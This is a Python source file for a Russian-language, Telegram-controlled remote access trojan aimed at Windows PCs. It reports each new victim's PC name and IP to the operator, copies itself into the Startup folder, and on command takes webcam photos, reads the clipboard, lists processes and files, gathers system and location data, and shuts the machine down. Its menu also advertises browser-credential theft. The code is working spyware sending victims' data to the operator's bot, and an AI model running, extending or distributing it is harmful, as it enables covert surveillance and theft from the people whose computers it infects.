import telebot
from telebot import types

import win32api
import platform
import psutil
import GPUtil
import time
adm_id = "id_adm" 
bot_token = "token"
import requests
import pyautogui as p
from win32com.client import GetObject
import os 
from PIL import ImageGrab
import cv2
import sys
import tkinter as tk
import pyperclip
import pygame
from ctypes import cast, POINTER
import shutil
import win32crypt
import json,base64
from os.path import basename
from datetime import datetime, timedelta
from Crypto.Cipher import AES
import shutil
import sqlite3
import ctypes
from tkinter import messagebox
import pyaudio
import numpy as np
import keyboard
import pyautogui
import threading


bot = telebot.TeleBot(bot_token)
admin_id = adm_id
uname = platform.uname()
bot.send_message(admin_id, "Обнаружен новый пользователь\n" + "\nPC_NAME: " + str(uname.node) + "\nIP: " + requests.get("https://api.ipify.org").text)

Thisfile = sys.argv[0]
Thisfile_name = os.path.basename(Thisfile) 
user_path = os.path.expanduser('~') 

if not os.path.exists(f"{user_path}\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\{Thisfile_name}"):
        os.system(f'copy "{Thisfile}" "{user_path}\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup"')
        bot.send_message(admin_id, f'{Thisfile_name} добавлен в автозагрузку')

def add_to_startup(src_file_path, startup_folder_path):
    file_name = os.path.basename(src_file_path)
    target_path = os.path.join(startup_folder_path, file_name)
    if not os.path.exists(target_path):
        try:
            shutil.copy(src_file_path, target_path)
            bot.send_message(admin_id, f'{file_name} успешно добавлен в автозагрузку')
        except Exception as e:
            bot.send_message(admin_id, f'Ошибка при добавлении {file_name} в автозагрузку: {e}')
    else:
        bot.send_message(admin_id, f'{file_name} уже существует в автозагрузке')

def main2():
    this_file = sys.argv[0]
    user_path = os.path.expanduser('~')
    startup_folder_path = os.path.join(user_path, 'AppData', 'Roaming', 'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Startup')
    add_to_startup(this_file, startup_folder_path)



def is_admin(user_id):
    return str(user_id) == admin_id

@bot.message_handler(commands=['start'])
def start(message):
    chat_id = message.chat.id
    username = message.chat.username
    if is_admin(chat_id):
        bot.reply_to(message, "Jumbo, брат! Кого трахнем сегодня?\nКоманды:\n/checkpc\n/procces\n/photo\n/info\n/screen\n/see_bufer\n/antiviruses\n/steal_chrome\n/opera_steal\n/off_system\n/path_info\n/change_language\n/rst_pc\n/lock")
    else:
        bot.send_message(message.chat.id, "Съеби отсюда!!")
        bot.send_message(admin_id, f"Какой-то хуесос ломится в нашего бота. Его id {chat_id}, Его username {username}")
@bot.message_handler(commands=['photo'])
def photo(message): 
    if message.from_user.id == admin_id:  
        try:
            
            cap = cv2.VideoCapture(0)
            dr = os.getcwd()
            for i in range(30):
                cap.read()
            ret, frame = cap.read()
            cv2.imwrite(dr + '\\4543t353454.png', frame)   
            cap.release()
            webcam = open(dr + '\\4543t353454.png','rb')
            bot.send_document(admin_id, webcam)
            os.remove(dr + '\\4543t353454.png')
        except Exception as e:
            bot.send_message(admin_id, e) 
    else: 
        bot.send_message('иди нахуй')
@bot.message_handler(commands=['info'])
def system_info(message):
    global namepc 

    uname = platform.uname()

    namepc = "\nИмя пк: " + str(uname.node)
    countofcpu = psutil.cpu_count(logical=True)
    allcpucount = "\nОбщее количество ядер процессора:" + str(countofcpu)

    cpufreq_freq = psutil.cpu_freq()
    cpufreq_info = "\nЧастота процессора: " + str(cpufreq_freq.max) + 'Mhz'

    svmem = psutil.virtual_memory()
    allram = "\nОбщая память ОЗУ: " + str(get_size(svmem.total))
    ramfree = "\nДоступно: " + str(get_size(svmem.available))
    ramuseg = "\nИспользуется: " + str(get_size(svmem.used))

    partitions = psutil.disk_partitions()
    disk_info = ""
    #for partition in partitions:
        #nameofdevice = "\nДиск: " + str(partition.device)
        #nameofdick = "\nИмя диска: " + str(partition.mountpoint)
        #typeoffilesystem = "\nТип файловой системы: " + str(partition.fstype)
        #try:
         #   partition_usage = psutil.disk_usage(partition.mountpoint)
        #except PermissionError:
         #   continue
        #allstorage = "\nОбщая память: " + str(get_size(partition_usage.total))
        #usedstorage = "\nИспользуется: " + str(get_size(partition_usage.used))
        #freestorage = "\nСвободно: " + str(get_size(partition_usage.free))
        #disk_info += nameofdevice + nameofdick + typeoffilesystem + allstorage + usedstorage + freestorage

    gpu_info = ""
    try:
        gpus = GPUtil.getGPUs()
        for gpu in gpus:
            gpu_name = "\nМодель видеокарты: " + gpu.name
            gpu_free_memory = "\nСвободно памяти в видеокарте: " + f"{gpu.memoryFree}MB"
            gpu_total_memory = "\nОбщая память видеокарты: " + f"{gpu.memoryTotal}MB"
            gpu_temperature = "\nТемпература видеокарты в данный момент: " + f"{gpu.temperature} °C"
            gpu_info += gpu_name + gpu_free_memory + gpu_total_memory + gpu_temperature
    except:
        gpu_info = "\nВидеокарты нету, либо она встроенная"

    headers = {
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
        'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:64.0) Gecko/20100101 Firefox/64.0'
    }
    drives = str(win32api.GetLogicalDriveStrings())
    drives = str(drives.split('\000')[:-1])
    
    global location1 
    
    try:
        ip = requests.get('https://api.ipify.org').text
        urlloc = 'http://ip-api.com/json/' + ip
        location1 = requests.get(urlloc, headers=headers).text
    except Exception as e:
        location1 = "Неизвестно"
        print(e)
    
    all_data = "Время: " + time.asctime() + '\n' + '\n' + "Процессор: " + platform.processor() + '\n' + "Система: " + platform.system() + ' ' + platform.release() + '\nДанные локации и IP:' + location1 + '\nДиски:' + drives + namepc + allcpucount + cpufreq_info + str(svmem) + allram + ramfree + ramuseg + disk_info + gpu_info
     
    bot.send_message(admin_id, all_data)
    
    
def get_size(bytes, suffix="B"):
    factor = 1024
    for unit in ["", "K", "M", "G", "T", "P"]:
        if bytes < factor:
            return f"{bytes:.2f}{unit}{suffix}"
        bytes /= factor
    

@bot.message_handler(commands=['photo'])
def photo(message):
    if is_admin(message.from_user.id):
        cap = cv2.VideoCapture(0)
        dr = os.getcwd()
        for i in range(30):
            cap.read()
        ret, frame = cap.read()
        cap.release()

        img_path = os.path.join(dr, '4543t353454.png')
        cv2.imwrite(img_path, frame)

        with open(img_path, 'rb') as webcam:
            bot.send_photo(message.chat.id, webcam)

        os.remove(img_path)
    else:
        bot.send_message(message.chat.id, "Съеби отсюда!!")

@bot.message_handler(commands=['see_bufer'])
def SeeEx(message):
    if is_admin(message.from_user.id):
        Buffer = pyperclip.paste()
        bot.send_message(admin_id, f'Буфер обмена:\n<code>{Buffer}</code>', parse_mode='HTML')
    else:
        bot.send_message(message.chat.id, 'У вас нет прав на выполнение этой команды.')


@bot.message_handler(commands=['procces']) 
def proc(message): 
     if message.from_user.id == admin_id:
            msg = bot.send_message(admin_id, 'Уно моменто...')
            result = [process.Properties_('Name').Value for process in GetObject('winmgmts:').InstancesOf('Win32_Process')]
            bot.edit_message_text(f'Весь список процессов:\n<code>{result}</code>', admin_id, msg.message_id, parse_mode='HTML')

@bot.message_handler(commands=['uninst'])
def uninst(message):
    if message.from_user.id == admin_id:
        Thisfile = sys.argv[0]
        startup_folder_path = os.path.join(os.path.expanduser('~'), 'AppData', 'Roaming', 'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Startup')
        file_name = os.path.basename(Thisfile)
        target_path = os.path.join(startup_folder_path, file_name)
        if os.path.exists(target_path):
            try:
                os.remove(target_path)
                bot.send_message(admin_id, f'{file_name} успешно удален из автозагрузки')
            except Exception as e:
                bot.send_message(admin_id, f'Ошибка при удалении {file_name} из автозагрузки: {e}')
        else:
            bot.send_message(admin_id, f'{file_name} не существует в автозагрузке')

@bot.message_handler(commands=['off_system'])
def shutdown(message):
    try:
        bot.send_message(admin_id, 'Выключаю пк ')
        os.system('shutdown /s /t 0')
    except Exception as e:
        bot.send_message(admin_id, e)

@bot.message_handler(commands=['path_info'])
def ListDir(message):
    try:
        bot.send_message(admin_id, 'Щас получим содержание директории в которой находимся...')
        ls = os.listdir()
        info = '\n'.join([str(elem) for elem in ls])

        if len(info) > 4096:
            for x in range(0, len(info), 4096):
                bot.send_message(admin_id, info[x:x+4096], parse_mode='HTML', disable_web_page_preview=True)
        else:
            bot.send_message(admin_id, info, parse_mode='HTML', disable_web_page_preview=True)
    except Exception as e:
        bot.send_message(admin_id, str(e))


bot.infinity_polling()
